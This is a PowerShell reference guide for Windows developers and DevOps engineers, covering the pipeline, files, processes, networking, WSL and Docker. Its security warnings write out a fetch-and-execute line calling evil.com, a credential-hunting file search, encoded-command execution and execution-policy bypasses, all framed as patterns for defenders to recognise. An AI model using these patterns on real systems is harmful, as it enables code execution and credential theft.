# PowerShell: The Real Developer's Guide
> Senior Windows DevOps & Security Engineering Perspective — Practical, Deep, No Fluff

---

## 1. How PowerShell Actually Works Internally

PowerShell is **not** `cmd.exe`. It is a **.NET runtime host**. Every command returns real **.NET objects** — not text strings. The text you see on screen is just a rendering layer on top of structured data.

```
[You type]  →  [Parser]  →  [Command Lookup]  →  [Pipeline Processor]  →  [Output Formatter]
                                Cmdlets / Aliases / External Binaries        (text is last step)
```

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 }
# $_ is a real [System.Diagnostics.Process] object — not a text line
# .CPU is a real numeric property — no parsing needed
```

**The pipeline passes objects in memory, not text.** This is the single most important concept.

### Verb-Noun Convention

| Verb | Meaning | Example |
|------|---------|---------|
| `Get-` | Read, no side effects | `Get-Process` |
| `Set-` | Modify existing | `Set-Location` |
| `New-` | Create | `New-Item` |
| `Remove-` | Delete | `Remove-Item` |
| `Invoke-` | Execute | `Invoke-WebRequest` |
| `Test-` | Boolean check | `Test-NetConnection` |
| `Enable-` | Turn on | `Enable-WindowsOptionalFeature` |

### Aliases — The Compatibility Trap

```powershell
ls / dir / gci  →  Get-ChildItem
cd              →  Set-Location
pwd             →  Get-Location
cat / type      →  Get-Content
rm / del        →  Remove-Item
curl / wget     →  Invoke-WebRequest   ← DANGEROUS TRAP
cp / copy       →  Copy-Item
mv / move       →  Move-Item
```

> ⚠️ `curl` in PowerShell is **not** the real curl binary. It's an alias for `Invoke-WebRequest` with a completely different interface. If you need real curl, call `curl.exe` explicitly.

> ⚠️ **Security:** Aliases can be overridden per-session. Attacker code can redefine `ls` to exfiltrate data silently. Never trust aliases in untrusted scripts.

```powershell
$PSVersionTable          # Check version — 5.1 (built-in) vs 7.x (pwsh.exe)
```

---

## 2. The Pipeline — PowerShell's Core Engine

```powershell
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 | Format-Table -AutoSize
```

**Execution flow:** `Get-Process` streams `[Process]` objects → `Sort-Object` buffers all (must see all to sort) → `Select-Object` takes first 10 → `Format-Table` renders.

### Critical Pipeline Rules

```powershell
# $_ = current object in pipeline block
Get-ChildItem C:\Logs | Where-Object { $_.Length -gt 1MB }
Get-ChildItem C:\Logs | ForEach-Object { Rename-Item $_ "$($_.Name).bak" }

# Format-* KILLS the pipeline — always use it LAST
# WRONG:
Get-Process | Format-Table | Where-Object { $_.CPU -gt 100 }   # Error

# RIGHT:
Get-Process | Where-Object { $_.CPU -gt 100 } | Format-Table -AutoSize
```

### Essential Pipeline Cmdlets

```powershell
Where-Object  { $_.Size -gt 100MB }          # Filter
Select-Object Name, CPU, Id                   # Pick properties
Sort-Object   LastWriteTime -Descending       # Sort
ForEach-Object { Write-Host $_.Name }         # Execute per object
Group-Object  Extension                       # Group by property
Measure-Object -Property Length -Sum          # Aggregate
Export-Csv    output.csv -NoTypeInformation   # Structured export
ConvertTo-Json                                # JSON output
Out-File      output.txt                      # Write to file
Tee-Object    output.txt                      # Write to file AND continue pipeline
```

---

## 3. Navigation & File System

### `Set-Location` / `Get-Location` (cd / pwd)

```powershell
cd C:\Projects
cd ..                        # Parent
cd ~                         # Home: C:\Users\YourName
cd -                         # Previous location (PS 6+)
cd "C:\Program Files"        # Quote paths with spaces
cd $env:USERPROFILE          # Use environment variable

# PowerShell PSDrives — unique navigation capability
cd HKLM:\SOFTWARE\Microsoft  # Navigate the Windows Registry like a filesystem
cd Env:\                      # Navigate environment variables
cd Cert:\LocalMachine\My      # Navigate certificate store

$PSScriptRoot                 # Directory of the RUNNING script — use this, not Get-Location
```

**In scripts, always use `Push-Location`/`Pop-Location` — never naked `cd`:**

```powershell
function Deploy-App {
    Push-Location C:\Build\Output   # Save caller's location
    # ... do work ...
    Pop-Location                    # Restore it
}
```

### `Get-ChildItem` (ls / dir)

Internally calls `FindFirstFile`/`FindNextFile` Win32 APIs and returns `[FileInfo]`/`[DirectoryInfo]` objects.

```powershell
Get-ChildItem C:\Projects -Recurse -Filter "*.log"           # Fast — OS-level filter
Get-ChildItem C:\Projects -Recurse -Include "*.log","*.txt"  # Slower — PS-level filter
Get-ChildItem C:\Projects -Recurse -Exclude "node_modules"
Get-ChildItem C:\Projects -File                              # Files only
Get-ChildItem C:\Projects -Directory                         # Dirs only
Get-ChildItem C:\Projects -Hidden -Force                     # Include hidden/system files
Get-ChildItem C:\Projects -Depth 2                           # Limit depth

# Real developer uses
Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Length -gt 500MB } |
    Select-Object FullName, @{N="Size(MB)";E={[math]::Round($_.Length/1MB,2)}} |
    Sort-Object "Size(MB)" -Descending

# Find recently modified files
Get-ChildItem C:\Projects -Recurse -File |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-24) } |
    Select-Object FullName, LastWriteTime
```

> ⚠️ **Attacker pattern:** `Get-ChildItem C:\ -Recurse -Include "*.kdbx","*.pfx","*.pem","id_rsa","*.key" -ErrorAction SilentlyContinue` — credential hunting. Run this on your own system to see what's exposed.

### File Operations

```powershell
# Create
New-Item -ItemType Directory -Path "C:\App\src\utils" -Force   # mkdir, nested, no error if exists
New-Item -ItemType File -Path "C:\App\app.py" -Value "# main"

# Copy
Copy-Item "C:\src" "C:\dst" -Recurse -Force    # Full directory tree
Copy-Item "*.config" "C:\Backup"

# Move / Rename
Move-Item "old.txt" "new.txt"                   # Rename in same directory
Move-Item "C:\Build\app.exe" "C:\Deploy\"       # Move to directory
Rename-Item "report.txt" "report_2024.txt"

# Delete — no Recycle Bin
Remove-Item "C:\temp\*" -Recurse -Force

# ALWAYS validate before destructive delete
if ([string]::IsNullOrWhiteSpace($path) -or -not (Test-Path $path)) {
    throw "Invalid path: '$path'"
}
Remove-Item $path -Recurse -Force

# -WhatIf on any destructive operation
Remove-Item "C:\Projects\*" -Recurse -WhatIf   # Simulates — deletes nothing
```

### ZIP Operations

```powershell
# Extract
Expand-Archive -Path "app.zip" -DestinationPath "C:\App" -Force

# Compress
Compress-Archive -Path "C:\App\*" -DestinationPath "app_backup.zip" -Force
Compress-Archive -Path "C:\App\*" -DestinationPath "app.zip" -Update   # Add to existing
```

---

## 4. Reading & Writing Files

### `Get-Content` (cat / type)

Internally reads file line-by-line using .NET `StreamReader`. Each line is a `[String]` object.

```powershell
Get-Content app.log                              # Read entire file
Get-Content app.log -Tail 50                     # Last 50 lines (like tail)
Get-Content app.log -Wait                        # Live follow (like tail -f)
Get-Content app.log | Select-Object -Last 100

# Read as single string (not line array)
Get-Content config.json -Raw                     # One string, preserves newlines
$json = Get-Content config.json -Raw | ConvertFrom-Json

# Read specific lines
(Get-Content app.log)[0..9]                      # Lines 1–10 (0-indexed array)

# Real use: parse log for errors
Get-Content "C:\Logs\app.log" -Tail 1000 |
    Where-Object { $_ -match "ERROR|FATAL" } |
    Select-Object -Last 20
```

### `Set-Content` / `Add-Content`

```powershell
Set-Content "output.txt" "Hello World"           # Overwrite (creates if not exists)
Set-Content "output.txt" $data -Encoding UTF8    # Always specify encoding

Add-Content "output.txt" "New line"              # Append
Add-Content "app.log" "[$(Get-Date)] Server started"

# Write .NET objects as text
Get-Process | Select-Object Name, CPU | ConvertTo-Csv | Set-Content processes.csv
```

> ⚠️ Default encoding in PS 5.1 is UTF-16 (BOM). This breaks Linux/WSL compatibility and JSON parsers. **Always use `-Encoding UTF8`.**

```powershell
# For cross-platform scripts
Set-Content "config.json" $jsonText -Encoding UTF8NoBOM   # PS 6+
[System.IO.File]::WriteAllText("config.json", $jsonText)  # Reliable in PS 5.1
```

### `Select-String` (grep equivalent)

Internally uses .NET Regex. Returns `[MatchInfo]` objects with file, line number, and match.

```powershell
Select-String "error" app.log                       # Case-insensitive by default
Select-String "ERROR" app.log -CaseSensitive
Select-String "^\d{4}-\d{2}-\d{2}" app.log         # Regex — lines starting with date
Select-String "password|secret|api_key" * -Recurse  # Search all files recursively
Select-String "TODO" *.py -List                     # Only show filenames

# Real dev use: find hardcoded secrets before committing
Get-ChildItem . -Recurse -Include "*.py","*.js","*.ts","*.env" |
    Select-String -Pattern "password\s*=\s*['""].+['""]|api_key\s*=\s*\S+" |
    Select-Object Filename, LineNumber, Line
```

**External alternative:** `findstr` (cmd.exe tool, still works in PS)

```powershell
findstr /s /i "error" *.log    # /s recursive, /i case-insensitive
findstr /r "^ERROR" app.log    # /r regex mode
```

`Select-String` is preferred because it returns objects. Use `findstr` when you need cmd.exe compatibility or are in a restricted environment.

---

## 5. Command Discovery

```powershell
# Find any command — cmdlet, alias, function, external binary
Get-Command python                  # Where is python?
Get-Command python | Select-Object Source  # Full path
Get-Command *network*               # Search by name pattern
Get-Command -Verb Remove            # All Remove-* cmdlets
Get-Command -Noun Process           # All *-Process cmdlets
Get-Command -CommandType Alias      # All aliases

# which/where equivalent
(Get-Command python).Source         # Full path of executable
where.exe python                    # CMD's where — searches PATH

# Get help — always start here
Get-Help Get-ChildItem              # Summary
Get-Help Get-ChildItem -Full        # Full docs with parameter details
Get-Help Get-ChildItem -Examples    # Show only examples
Get-Help Get-ChildItem -Online      # Open Microsoft docs in browser
Update-Help                         # Download latest help files (run as admin)
```

---

## 6. Package Management

### How Package Managers Work Internally

Both `winget` and `choco` follow the same model:

```
[Command] → [Query manifest repository] → [Download installer/binary]
         → [Verify hash] → [Run installer silently] → [Update PATH]
```

The difference: `winget` is Microsoft's official tool backed by the Windows Package Manager repository. `choco` is community-driven with a larger package catalog.

### winget

```powershell
winget search python                            # Search package catalog
winget install Python.Python.3.12               # Install by ID (exact)
winget install Python.Python.3.12 --silent      # No UI prompts
winget install Python.Python.3.12 --location "C:\Tools\Python"  # Custom path
winget upgrade --all                            # Update every installed package
winget list                                     # All installed packages + available updates
winget uninstall Python.Python.3.12
winget show Git.Git                             # Package metadata, version, source

# Install multiple packages — DevOps bootstrap script
$packages = @(
    "Git.Git",
    "Python.Python.3.12",
    "OpenJS.NodeJS.LTS",
    "Microsoft.VisualStudioCode",
    "Docker.DockerDesktop"
)
foreach ($pkg in $packages) {
    winget install $pkg --silent --accept-package-agreements --accept-source-agreements
}
```

### Chocolatey

```powershell
# Install Chocolatey itself (run as Admin)
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco install git -y                       # -y = auto-confirm
choco install python nodejs vscode -y      # Multiple packages
choco upgrade all -y                       # Update everything
choco list --local-only                    # Installed packages
choco uninstall git -y
```

> ⚠️ `choco install` runs PowerShell install scripts from the community. A compromised package can run arbitrary code as SYSTEM. Always check package download counts and verification status.

---

## 7. Downloading Files Securely

### `Invoke-WebRequest`

Internally uses .NET `HttpClient`. By default follows redirects, handles cookies, returns a full response object.

```powershell
# Basic download
Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "file.zip"

# With progress suppressed (dramatically faster for large files)
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri "https://example.com/file.zip" -OutFile "file.zip"
$ProgressPreference = 'Continue'

# Download and verify hash — ALWAYS do this for executables
$uri  = "https://releases.example.com/app-v2.zip"
$dest = "C:\downloads\app-v2.zip"
$expectedHash = "ABC123..."

Invoke-WebRequest -Uri $uri -OutFile $dest
$actualHash = (Get-FileHash $dest -Algorithm SHA256).Hash
if ($actualHash -ne $expectedHash) {
    Remove-Item $dest -Force
    throw "Hash mismatch. File may be tampered with."
}
```

**`Start-BitsTransfer`** — Better for large files (uses Windows BITS service: resumable, background):

```powershell
Start-BitsTransfer -Source "https://example.com/large.iso" -Destination "C:\ISOs\large.iso"
```

> ⚠️ **Never download and execute in one line without hash verification:**
> ```powershell
> # DANGEROUS — common attacker pattern AND common beginner mistake
> Invoke-Expression (Invoke-WebRequest "http://evil.com/payload.ps1").Content
> iex (iwr "http://any-url.com/script.ps1").Content
> ```
> This is a Living-Off-the-Land (LotL) attack technique. Defenders monitor for `iex`+`iwr` combinations.

---

## 8. Process Management

### `Get-Process`

Returns `[System.Diagnostics.Process]` objects from the Windows process table (same data source as Task Manager).

```powershell
Get-Process                                      # All processes
Get-Process -Name "chrome"                       # By name (no .exe)
Get-Process -Id 1234                             # By PID
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
Get-Process | Sort-Object WorkingSet -Descending | Select-Object Name, Id,
    @{N="RAM(MB)";E={[math]::Round($_.WorkingSet/1MB,1)}} | Select-Object -First 15

# Find process by port (combine with network)
$port = 8080
$conn = Get-NetTCPConnection -LocalPort $port -ErrorAction SilentlyContinue
if ($conn) { Get-Process -Id $conn.OwningProcess }
```

### `Stop-Process` / `Start-Process`

```powershell
Stop-Process -Name "notepad"                     # Graceful SIGTERM equivalent
Stop-Process -Id 1234 -Force                     # Force kill (SIGKILL equivalent)
Stop-Process -Name "chrome" -Force               # Kill all chrome processes

# taskkill — CMD equivalent, still useful in PS
taskkill /IM notepad.exe /F                      # /F = force, /IM = image name
taskkill /PID 1234 /F

# Start-Process — the real ShellExecute wrapper
Start-Process "notepad.exe"                                          # Open app
Start-Process "cmd.exe" -ArgumentList "/c dir C:\ > C:\out.txt"     # With args
Start-Process "app.exe" -WorkingDirectory "C:\App" -NoNewWindow -Wait
Start-Process "powershell.exe" -Verb RunAs      # Elevate to admin (UAC prompt)
Start-Process "https://google.com"              # Opens in default browser

# Run process and capture output
$result = Start-Process "python" -ArgumentList "script.py" `
    -RedirectStandardOutput "out.txt" `
    -RedirectStandardError  "err.txt" `
    -Wait -PassThru -NoNewWindow
Write-Host "Exit code: $($result.ExitCode)"
```

> ⚠️ **Attacker abuse:** `Start-Process powershell.exe -ArgumentList "-EncodedCommand <base64>"` — base64-encoded payload execution. Defenders look for `-EncodedCommand` or `-enc` flags in process creation logs.

---

## 9. Service Management

### How Windows Services Work Internally

Services are executables registered with the **Service Control Manager (SCM)** — `services.exe`. They run in their own session (Session 0), isolated from user desktops, with defined startup type and security context.

```powershell
Get-Service                                     # All services
Get-Service -Name "wuauserv"                    # Windows Update service
Get-Service | Where-Object { $_.Status -eq "Running" } | Sort-Object DisplayName
Get-Service | Where-Object { $_.StartType -eq "Automatic" -and $_.Status -ne "Running" }
# ^ Finds services set to auto-start but currently stopped — broken services

Start-Service   -Name "wuauserv"
Stop-Service    -Name "wuauserv" -Force
Restart-Service -Name "wuauserv" -Force
Set-Service     -Name "wuauserv" -StartupType Disabled  # Prevent auto-start
Set-Service     -Name "wuauserv" -StartupType Automatic

# Real DevOps: check if your service is running in a deployment script
$service = Get-Service -Name "MyAppService" -ErrorAction SilentlyContinue
if ($null -eq $service) {
    throw "Service 'MyAppService' not found. Was it installed?"
}
if ($service.Status -ne "Running") {
    Start-Service -Name "MyAppService"
    Start-Sleep -Seconds 3
    $service.Refresh()
    if ($service.Status -ne "Running") { throw "Service failed to start." }
}
Write-Host "Service is running."
```

---

## 10. Networking

### `Get-NetTCPConnection` (netstat replacement)

Returns `[TcpConnectionInformation]` objects — far more useful than raw `netstat` output.

```powershell
Get-NetTCPConnection                                         # All TCP connections
Get-NetTCPConnection -State Listen                           # Listening ports
Get-NetTCPConnection -LocalPort 443                          # Who's on port 443
Get-NetTCPConnection -State Established                      # Active connections

# Map ports to process names — the killer feature
Get-NetTCPConnection -State Listen |
    Select-Object LocalPort, State,
        @{N="ProcessName";E={(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name}} |
    Sort-Object LocalPort

# Find what's using port 8080
$pid = (Get-NetTCPConnection -LocalPort 8080 -ErrorAction SilentlyContinue).OwningProcess
if ($pid) { Get-Process -Id $pid | Select-Object Name, Id, Path }

# netstat — still valid, sometimes faster
netstat -ano              # All connections with PIDs
netstat -an | findstr "LISTENING"
netstat -b                # Show binary names (requires admin)
```

### `Test-NetConnection` (ping + port test)

```powershell
Test-NetConnection google.com                        # ICMP ping
Test-NetConnection google.com -Port 443              # TCP port test
Test-NetConnection 10.0.0.1 -Port 5432               # Is PostgreSQL reachable?
Test-NetConnection 10.0.0.1 -Port 6379               # Is Redis reachable?

# In scripts — clean boolean result
if ((Test-NetConnection "db.internal" -Port 5432).TcpTestSucceeded) {
    Write-Host "Database is reachable"
} else {
    throw "Cannot reach database on port 5432"
}

# ipconfig — raw but fast
ipconfig                   # All adapters, IPs, gateways
ipconfig /all              # Full details: MAC, DNS, DHCP lease
ipconfig /flushdns         # Clear DNS cache
ipconfig /release && ipconfig /renew   # DHCP renewal

# Resolve DNS
Resolve-DnsName google.com
Resolve-DnsName google.com -Type MX   # Mail records
```

---

## 11. Environment Variables & PATH

### How Environment Variables Work in Windows

Windows has three scopes, hierarchical: Machine → User → Process.

```
[Machine] HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
[User]    HKCU\Environment
[Process] In-memory for current session only — inherits from User + Machine at launch
```

```powershell
# Read
$env:PATH                              # Current process PATH
$env:USERPROFILE                       # C:\Users\YourName
$env:COMPUTERNAME
$env:USERNAME
[Environment]::GetEnvironmentVariable("PATH", "Machine")  # Machine-level only
[Environment]::GetEnvironmentVariable("PATH", "User")     # User-level only

# Set — current session only (lost when terminal closes)
$env:MY_API_KEY = "abc123"
$env:PATH += ";C:\Tools\myapp\bin"

# Set permanently
[Environment]::SetEnvironmentVariable("MY_VAR", "value", "User")     # User scope
[Environment]::SetEnvironmentVariable("MY_VAR", "value", "Machine")  # Machine scope (admin)

# Add to PATH permanently without duplicating
function Add-ToPath {
    param([string]$newPath, [string]$scope = "User")
    $current = [Environment]::GetEnvironmentVariable("PATH", $scope)
    if ($current -split ";" -notcontains $newPath) {
        [Environment]::SetEnvironmentVariable("PATH", "$current;$newPath", $scope)
        $env:PATH += ";$newPath"   # Also update current session
        Write-Host "Added '$newPath' to $scope PATH"
    } else {
        Write-Host "'$newPath' already in PATH"
    }
}
Add-ToPath "C:\Tools\myapp\bin"
```

> ⚠️ **Security:** Storing secrets in environment variables is better than hardcoding, but they're readable by any process running as the same user. For production secrets, use Windows Credential Manager, Azure Key Vault, or HashiCorp Vault.

```powershell
# Read Windows Credential Manager (not plain env vars)
$cred = Get-StoredCredential -Target "MyAppDB"   # Requires CredentialManager module
```

---

## 12. Execution Policy & Permissions

### How Execution Policy Works Internally

Execution policy is **not a security boundary** — it's a safety guardrail. It's stored in the registry and checked by the PowerShell host before running scripts. It can be bypassed by:

- Running code from stdin: `powershell.exe -Command "..."`
- Encoding: `powershell.exe -EncodedCommand <base64>`
- Dot-sourcing a remote script after download
- Changing scope: `-Scope Process`

```powershell
Get-ExecutionPolicy                          # Current effective policy
Get-ExecutionPolicy -List                    # All scopes

# Scopes (most restrictive wins):
# MachinePolicy > UserPolicy > Process > CurrentUser > LocalMachine

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser   # Recommended for developers
# RemoteSigned: local scripts run freely; downloaded scripts must be signed

Set-ExecutionPolicy Bypass -Scope Process   # This session only — common in CI/CD
Set-ExecutionPolicy Restricted              # Block all scripts (default on new Windows)
Set-ExecutionPolicy Unrestricted            # Run everything — DON'T use on production

# Unblock a single downloaded script without changing global policy
Unblock-File -Path "C:\Downloads\setup.ps1"
Get-Item "C:\Downloads\setup.ps1" | Get-FileHash    # Verify before unblocking

# Check if a file has the "downloaded from internet" mark
Get-Item "setup.ps1" -Stream Zone.Identifier | Get-Content
# Zone 3 = Internet. Unblock-File removes this stream.
```

### Admin Permissions — UAC

```powershell
# Check if running as admin
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

# Self-elevating script pattern
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
        ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-File `"$PSCommandPath`""
    exit
}
```

---

## 13. Windows Features, DISM & SFC

### How DISM Works Internally

DISM (Deployment Image Servicing and Management) communicates with the **Component-Based Servicing (CBS)** stack — the same engine Windows Update uses. It operates on the WIM image of Windows.

```powershell
# List all optional features and status
Get-WindowsOptionalFeature -Online | Sort-Object FeatureName | Format-Table

# Enable features (admin required)
Enable-WindowsOptionalFeature -Online -FeatureName "Microsoft-Windows-Subsystem-Linux" -NoRestart
Enable-WindowsOptionalFeature -Online -FeatureName "VirtualMachinePlatform" -NoRestart
Enable-WindowsOptionalFeature -Online -FeatureName "Microsoft-Hyper-V-All" -NoRestart

# DISM directly — more powerful
dism /Online /Enable-Feature /FeatureName:Microsoft-Hyper-V-All /All /NoRestart
dism /Online /Get-Features /Format:Table             # List all features
dism /Online /Cleanup-Image /CheckHealth             # Quick corruption check
dism /Online /Cleanup-Image /ScanHealth              # Deeper scan (~5 min)
dism /Online /Cleanup-Image /RestoreHealth           # Download and repair (~20 min)

# Fix corrupted system files
sfc /scannow                  # System File Checker — repairs from WinSxS store
# Run sfc AFTER DISM RestoreHealth if system is corrupted
```

---

## 14. WSL — Windows Subsystem for Linux

### How WSL Works Internally

WSL2 runs a real Linux kernel inside a lightweight Hyper-V VM (Utility VM). Each distro is a container-like environment sharing this kernel. The Windows filesystem is mounted at `/mnt/c/`. Network is NAT'd by default.

```powershell
# Full WSL2 setup (one-time, admin, requires restart)
wsl --install                                      # Installs WSL2 + Ubuntu by default
wsl --install -d Ubuntu-22.04
wsl --install -d Debian

wsl --list --verbose                               # List distros + version + status
wsl --set-default-version 2                        # Always use WSL2
wsl --set-default Ubuntu-22.04                     # Default distro
wsl --set-version Ubuntu-22.04 2                   # Convert existing distro to WSL2

wsl                                                # Open default distro
wsl -d Ubuntu-22.04                                # Open specific distro
wsl -u root                                        # Open as root
wsl hostname -I                                    # Get WSL IP address

# Run a single command in WSL
wsl ls -la /mnt/c/Projects

# Shutdown
wsl --shutdown                                     # Stop all running distros
wsl -t Ubuntu-22.04                                # Stop one distro

# Export/Import — backup and restore distros
wsl --export Ubuntu-22.04 "C:\Backup\ubuntu.tar"
wsl --import Ubuntu-Restored "C:\WSL\Ubuntu" "C:\Backup\ubuntu.tar"
```

### WSL Troubleshooting

```powershell
# "WSL 2 requires an update to its kernel component"
wsl --update                                       # Update WSL kernel

# Enable required features (if wsl --install failed)
Enable-WindowsOptionalFeature -Online -FeatureName "Microsoft-Windows-Subsystem-Linux" -NoRestart
Enable-WindowsOptionalFeature -Online -FeatureName "VirtualMachinePlatform" -NoRestart
# Then restart

# Check if Virtualization is enabled in BIOS
Get-ComputerInfo | Select-Object HyperVisorPresent, HyperVRequirementVirtualizationFirmwareEnabled

# WSL can't connect to internet
# Fix: Reset winsock and DNS
netsh winsock reset
netsh int ip reset
ipconfig /flushdns

# Inside WSL — fix /etc/resolv.conf (DNS issues)
# sudo rm /etc/resolv.conf
# echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf

# Disk cleanup — WSL VHDX doesn't shrink automatically
wsl --shutdown
Optimize-VHD -Path "$env:USERPROFILE\AppData\Local\Packages\CanonicalGroup*\LocalState\ext4.vhdx" -Mode Full
```

---

## 15. Docker Preparation

### Prerequisites Checklist

```powershell
# 1. Enable Hyper-V and containers
Enable-WindowsOptionalFeature -Online -FeatureName "Microsoft-Hyper-V-All" -NoRestart
Enable-WindowsOptionalFeature -Online -FeatureName "Containers" -NoRestart

# 2. Enable WSL2 (Docker Desktop prefers WSL2 backend)
wsl --install
wsl --set-default-version 2

# 3. Install Docker Desktop via winget
winget install Docker.DockerDesktop --silent --accept-package-agreements

# After restart, verify
docker --version
docker info
docker run hello-world        # Pulls from Docker Hub, runs in container
```

### Docker DevOps Workflows in PowerShell

```powershell
# Build image
docker build -t myapp:latest -f Dockerfile .
docker build -t myapp:latest --build-arg ENV=production .

# Run containers
docker run -d -p 8080:80 --name my-nginx nginx:alpine
docker run -it --rm -v "${PWD}:/app" -w /app python:3.12 bash  # Interactive dev container

# Real dev workflow — run and exec
docker run -d --name postgres `
    -e POSTGRES_PASSWORD=devpass `
    -e POSTGRES_DB=myapp `
    -p 5432:5432 `
    postgres:16-alpine
docker exec -it postgres psql -U postgres

# Compose
docker compose up -d              # Start services in background
docker compose logs -f app        # Follow logs for service
docker compose down -v            # Stop and remove volumes

# Cleanup
docker system prune -af           # Remove unused images, containers, networks
docker volume prune               # Remove unused volumes

# Check container resource usage
docker stats                      # Live resource monitor
docker inspect my-nginx | ConvertFrom-Json  # Full container config as PS object
```

---

## 16. Developer Toolchain

```powershell
# Python
python --version
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
python -m venv .venv
.\.venv\Scripts\Activate.ps1      # Activate virtualenv
python -m pip install flask        # Now installs into venv

# Node.js / npm
node --version
npm --version
npm init -y
npm install express axios          # Install packages
npm run dev                        # Run dev script from package.json
npx create-react-app myapp         # Without installing globally

# Git
git init
git clone https://github.com/org/repo.git
git status
git add .
git commit -m "feat: initial setup"
git push origin main
git log --oneline --graph --all    # Visual branch graph

# Check versions of everything
@("git","python","node","npm","docker","wsl") | ForEach-Object {
    $v = & $_ --version 2>&1
    [PSCustomObject]@{ Tool = $_; Version = $v }
} | Format-Table
```

---

## 17. Automation & Clean Script Architecture

### Script Structure Template

```powershell
#Requires -Version 5.1
#Requires -RunAsAdministrator

<#
.SYNOPSIS
    Deploy application to target environment.
.PARAMETER Environment
    Target: dev, staging, prod
.PARAMETER Version
    Semantic version string (e.g., 1.2.3)
.EXAMPLE
    .\Deploy-App.ps1 -Environment staging -Version 1.2.3
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [Parameter(Mandatory)]
    [ValidateSet("dev", "staging", "prod")]
    [string]$Environment,

    [Parameter(Mandatory)]
    [ValidatePattern("^\d+\.\d+\.\d+$")]
    [string]$Version
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$timestamp][$Level] $Message" -ForegroundColor $(
        switch ($Level) {
            "ERROR" { "Red" }; "WARN" { "Yellow" }; default { "Cyan" }
        }
    )
}

function Get-Config {
    param([string]$Env)
    $configPath = Join-Path $PSScriptRoot "config.$Env.json"
    if (-not (Test-Path $configPath)) { throw "Config not found: $configPath" }
    Get-Content $configPath -Raw | ConvertFrom-Json
}

function Deploy-Application {
    param([object]$Config, [string]$Version)
    Write-Log "Deploying v$Version to $($Config.deployPath)"

    if ($PSCmdlet.ShouldProcess($Config.deployPath, "Deploy v$Version")) {
        # deployment logic here
    }
}

try {
    $config = Get-Config -Env $Environment
    Deploy-Application -Config $config -Version $Version
    Write-Log "Deployment complete."
} catch {
    Write-Log $_.Exception.Message -Level "ERROR"
    exit 1
}
```

### Key Patterns

```powershell
# Strict mode — catches undefined variables, uninitialized members
Set-StrictMode -Version Latest

# Stop on any error — essential for automation
$ErrorActionPreference = "Stop"

# Per-command error control
Get-Item "maybe-exists.txt" -ErrorAction SilentlyContinue

# Test before act
if (Test-Path $path) { Remove-Item $path }
if (Get-Command "docker" -ErrorAction SilentlyContinue) { ... }

# Here-strings for multiline text
$dockerfile = @"
FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
CMD ["python", "app.py"]
"@
$dockerfile | Set-Content Dockerfile -Encoding UTF8

# Splatting — clean parameter passing
$params = @{
    Uri     = "https://api.example.com/deploy"
    Method  = "POST"
    Headers = @{ Authorization = "Bearer $token" }
    Body    = $body | ConvertTo-Json
}
Invoke-RestMethod @params
```

---

## 18. System Monitoring

```powershell
# CPU and Memory snapshot
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 |
    Select-Object Name, Id, CPU,
        @{N="RAM(MB)";E={[math]::Round($_.WorkingSet/1MB,1)}} |
    Format-Table -AutoSize

# Disk usage per drive
Get-PSDrive -PSProvider FileSystem |
    Select-Object Name, @{N="Used(GB)";E={[math]::Round(($_.Used/1GB),2)}},
        @{N="Free(GB)";E={[math]::Round(($_.Free/1GB),2)}},
        @{N="Total(GB)";E={[math]::Round((($_.Used+$_.Free)/1GB),2)}} |
    Format-Table -AutoSize

# Event log — find errors in last 24h
Get-EventLog -LogName Application -EntryType Error -Newest 50 |
    Select-Object TimeGenerated, Source, Message | Format-List

# Modern event log (PS 6+ / newer systems)
Get-WinEvent -FilterHashtable @{
    LogName   = 'Application'
    Level     = 2          # Error
    StartTime = (Get-Date).AddHours(-24)
} | Select-Object TimeCreated, ProviderName, Message | Format-List
```

---

## 19. Real-World Workflows

### DevOps: Full Dev Environment Bootstrap

```powershell
#Requires -RunAsAdministrator

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

Write-Host "=== Developer Environment Bootstrap ===" -ForegroundColor Cyan

# 1. Enable WSL2 + Hyper-V
$features = @("Microsoft-Windows-Subsystem-Linux","VirtualMachinePlatform","Microsoft-Hyper-V-All")
foreach ($f in $features) {
    $state = (Get-WindowsOptionalFeature -Online -FeatureName $f).State
    if ($state -ne "Enabled") {
        Enable-WindowsOptionalFeature -Online -FeatureName $f -NoRestart | Out-Null
        Write-Host "  Enabled: $f"
    }
}

# 2. Install core packages
$packages = @("Git.Git","Python.Python.3.12","OpenJS.NodeJS.LTS","Microsoft.VisualStudioCode","Docker.DockerDesktop")
foreach ($pkg in $packages) {
    winget install $pkg --silent --accept-package-agreements --accept-source-agreements 2>&1 | Out-Null
    Write-Host "  Installed: $pkg"
}

# 3. Configure Git
git config --global core.autocrlf input
git config --global init.defaultBranch main

Write-Host "Restart required to complete WSL2/Hyper-V setup." -ForegroundColor Yellow
```

### Debugging: Port Conflict

```powershell
# App fails to start — "port already in use"
$port = 8080
